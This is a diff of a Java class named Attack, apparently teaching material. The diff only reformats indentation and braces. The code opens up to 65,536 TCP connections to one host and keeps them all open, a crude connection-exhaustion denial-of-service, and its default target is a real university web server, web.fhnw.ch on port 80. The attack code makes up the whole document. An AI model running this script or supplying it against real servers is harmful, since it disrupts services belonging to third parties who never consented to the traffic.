@@ -7,31 +7,35 @@ import java.util.Set;
 
 public class Attack {
 
-	public static void main(String[] args) throws Exception {
-		String host = "web.fhnw.ch";
-		// Bsp: https://web.fhnw.ch/plattformen/makerstudio/
-		int port = 80;
+    public static void main(String[] args) throws Exception {
+        String host = "web.fhnw.ch";
+        // Bsp: https://web.fhnw.ch/plattformen/makerstudio/
+        int port = 80;
 
-		if (args.length > 0) { host = args[0]; }
-		if (args.length > 1) { port = Integer.parseInt(args[1]); }
+        if (args.length > 0) {
+            host = args[0];
+        }
+        if (args.length > 1) {
+            port = Integer.parseInt(args[1]);
+        }
 
-		Set<Socket> set = new HashSet<>();
+        Set<Socket> set = new HashSet<>();
 
-		for (int i = 0; i < 65536; i++) {
-			if (i % 100 == 0) System.out.println(i);
-			Socket s = null;
-			try {
-				s = new Socket(host, port);
-			} catch(IOException e) {
-				System.out.println(e.getMessage());
-				break;
-			}
-			set.add(s);
-		}
-		System.in.read();
-		System.out.println("done");
+        for (int i = 0; i < 65536; i++) {
+            if (i % 100 == 0) System.out.println(i);
+            Socket s = null;
+            try {
+                s = new Socket(host, port);
+            } catch (IOException e) {
+                System.out.println(e.getMessage());
+                break;
+            }
+            set.add(s);
+        }
+        System.in.read();
+        System.out.println("done");
 
-	}
+    }
 }
 
 /*
